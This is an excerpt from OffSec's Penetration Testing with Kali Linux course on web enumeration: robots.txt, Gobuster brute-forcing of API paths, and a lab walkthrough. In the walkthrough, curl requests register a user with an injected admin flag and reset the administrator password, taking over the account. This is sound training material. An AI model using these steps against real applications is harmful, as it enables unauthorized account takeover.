### References
- Mozilla (2022). [X-Forwarded-For](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For)
- IETF (2012). [RFC 6648](https://www.rfc-editor.org/rfc/rfc6648)
- Amazon Web Services, Inc. (2022). [Request and Response Behavior for Custom Origins](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/RequestAndResponseBehaviorCustomOrigin.html#request-custom-headers-behavior)
- Sitemaps.org (2022). [Sitemaps Protocol](https://www.sitemaps.org/)
- Mozilla (2022). [JSON](https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Objects/JSON)

### Copyright
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.
Made in Morocco

### Penetration Testing with Kali Linux

#### Additional Information
The "x-amz-cf-id" header indicates that the application uses Amazon CloudFront.

#### Sitemaps
Sitemaps are another important element to consider when enumerating web applications. These files help search engine bots crawl and index sites, and they can also include directives to exclude certain URLs from being crawled, such as sensitive pages or administrative consoles. These are exactly the types of pages we are interested in.

- **Inclusive Directives**: Performed using the sitemaps protocol.
- **Exclusive Directives**: Specified in the `robots.txt` file.

For example, we can retrieve the `robots.txt` file from `www.google.com` using `curl`:

```bash
kali@kali:~$ curl https://www.google.com/robots.txt
User-agent: *
Disallow: /search
Allow: /search/about
Allow: /search/static
Allow: /search/howsearchworks
Disallow: /sdch
Disallow: /groups
Disallow: /index.html?
Disallow: /?
Allow: /?hl=
...
```

**Listing 104 - robots.txt for www.google.com**

- **Allow and Disallow Directives**: These indicate which pages or directories "polite" web crawlers may or may not access. While some listed pages and directories may not be interesting or even invalid, sitemap files should not be overlooked as they may contain clues about the website layout or other useful information.

#### Enumerating and Abusing APIs
In many cases, our penetration test target is an internally-built, closed-source web application that comes with several Application Programming Interfaces (APIs). These APIs interact with the back-end logic and provide a robust set of functions to the web application. A specific type of API, Representational State Transfer (REST), is used for various purposes, including authentication.

In a white-box test, we would receive complete API documentation. However, in a black-box test, we need to discover the target's API ourselves.

We can use Gobuster to brute force API endpoints. For instance, if our API gateway web server is listening on port 5001 at 192.168.50.16, we can attempt a directory brute force attack.

API paths often follow a pattern like `/api_name/v1`.

**Listing 105 - API Path Naming Convention**

To brute force API paths, we can use a wordlist and patterns. Here’s an example of a simple pattern file:

```text
{GOBUSTER}/v1
{GOBUSTER}/v2
```

**Listing 106 - Gobuster Pattern**

Now, we can enumerate the API with Gobuster:

```bash
kali@kali:~$ gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
===============================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url: http://192.168.50.16:5001
[+] Method: GET
[+] Threads: 10
[+] Wordlist: /usr/share/wordlists/dirb/big.txt
[+] Patterns: pattern (1 entries)
[+] Negative Status codes: 404
[+] User Agent: gobuster/3.1.0
[+] Timeout: 10s
===============================================================
2022/04/06 04:19:46 Starting gobuster in directory enumeration mode
===============================================================
/books/v1 (Status: 200) [Size: 235]
/console (Status: 200) [Size: 1985]
/ui (Status: 308) [Size: 265] [--> http://192.168.50.16:5001/ui/]
/users/v1 (Status: 200) [Size: 241]
```

**Listing 107 - Bruteforcing API Paths**

We discovered multiple hits, including two interesting entries: `/books/v1` and `/users/v1`.

If we browse to the `/ui` path, we might find the entire API documentation. This is common in white-box testing but rare in black-box testing.

Let’s inspect the `/users` API with `curl`:

```bash
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 241
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 09:27:50 GMT

{
"users": [
{
"email": "PI:EMAIL",
"username": "name1"
},
{
"email": "PI:EMAIL",
"username": "name2"
},
{
"email": "PI:EMAIL",
"username": "admin"
}
]
}
```

**Listing 108 - Obtaining Users’ Information**

The application returned three user accounts, including an administrative account. We can use this information to attempt another brute force attack, targeting the admin user with a smaller wordlist. To check if any further API properties are related to the username, we can expand the API path by inserting the admin username.

```bash
kali@kali:~$ gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url: http://192.168.50.16:5001/users/v1/admin/
[+] Method: GET
[+] Threads: 10
[+] Wordlist: /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes: 404
[+] User Agent: gobuster/3.1.0
[+] Timeout: 10s
===============================================================
2022/04/06 06:40:12 Starting gobuster in directory enumeration mode
===============================================================
/email (Status: 405) [Size: 142]
/password (Status: 405) [Size: 142]
===============================================================
2022/04/06 06:40:35 Finished
===============================================================
```

**Listing 109 - Discovering Extra APIs**

The `/password` API path seems interesting, so let’s probe it via `curl`:

```bash
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/admin/password
HTTP/1.0 405 METHOD NOT ALLOWED
Content-Type: application/problem+json
Content-Length: 142
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 10:58:51 GMT

{
"detail": "The method is not allowed for the requested URL.",
"status": 405,
"title": "Method Not Allowed",
"type": "about:blank"
}
```

**Listing 110 - Discovering Unsupported Methods**

Instead of a 404 Not Found response, we received a 405 METHOD NOT ALLOWED, indicating that the URL is present but our HTTP method is unsupported. By default, `curl` uses the GET method, so we can try different methods like POST or PUT.

Both POST and PUT methods, if permitted, could allow us to override the user credentials. Let’s first verify if the login method is supported:

```bash
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/login
HTTP/1.0 404 NOT FOUND
Content-Type: application/json
Content-Length: 48
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 12:04:30 GMT

{ "status": "fail", "message": "User not found"}
```

**Listing 111 - Inspecting the ‘login’ API**

Although we received a 404 NOT FOUND message, the status message indicates that the API exists. We need to find the correct way to interact with it.

Next, we will convert the above GET request into a POST and provide our payload in JSON format:

```bash
kali@kali:~$ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/login
{ "status": "fail", "message": "Password is not correct for the given username."}
```

**Listing 112 - Crafting a POST Request Against the Login API**

The API return message shows that the authentication failed, meaning the API parameters are correctly formed.

Since we don’t know the admin’s password, let’s try registering a new user:

```bash
kali@kali:~$ curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
{ "status": "fail", "message": "'email' is a required property"}
```

**Listing 113 - Attempting New User Registration**

The API replied with a fail message, stating that we should also include an email address. Let’s add the admin key with a True value:

```bash
kali@kali:~$ curl -d '{"password":"lab","username":"offsec","email":"PI:EMAIL","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}
```

**Listing 114 - Attempting to Register a New User as Admin**

Since we received no error, it seems we were able to successfully register a new user as an admin, which should not be permitted by design. Next, let’s log in with the credentials we just created:

```bash
kali@kali:~$ curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/login
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew", "message": "Successfully logged in.", "status": "success"}
```

**Listing 115 - Logging in as an Admin User**

We were able to sign in and retrieve a JWT authentication token. To prove that we are an administrative user, we should use this token to change the admin user password.

We can attempt this by forging a POST request that targets the password API:

```bash
kali@kali:~$ curl \
'http://192.168.50.16:5002/users/v1/admin/password' \
-H 'Content-Type: application/json' \
-H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
-d '{"password": "pwned"}'
{
"detail": "The method is not allowed for the requested URL.",
"status": 405,
"title": "Method Not Allowed",
"type": "about:blank"
}
```

**Listing 116 - Attempting to Change the Administrator Password via a POST Request**

The application states that the method used is incorrect, so we need to try another one. The PUT method is often used to replace a value, so let’s try that next:

```bash
kali@kali:~$ curl -X 'PUT' \
'http://192.168.50.16:5002/users/v1/admin/password' \
-H 'Content-Type: application/json' \
-H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciODiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
-d '{"password": "pwned"}'
```

**Listing 117 - Attempting to Change the Administrator Password via a PUT Request**

This time, we received no error message, so we can assume that no error was thrown by the application backend logic. To prove that our attack succeeded, we can try logging in as admin using the newly-changed password:

```bash
kali@kali:~$ curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/login
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzIxMjgsImlhdCI6MTY0OTI3MTgyOCwic3ViIjoiYWRtaW4ifQ.yNgxeIUH0XLElK95TCU88lQSLP6lCl7usZYoZDlUlo0", "message": "Successfully logged in.", "status": "success"}
```

**Listing 118 - Successfully Logging in as the Admin Account**

We managed to take over the admin account by exploiting a logical privilege escalation bug present in the registration API.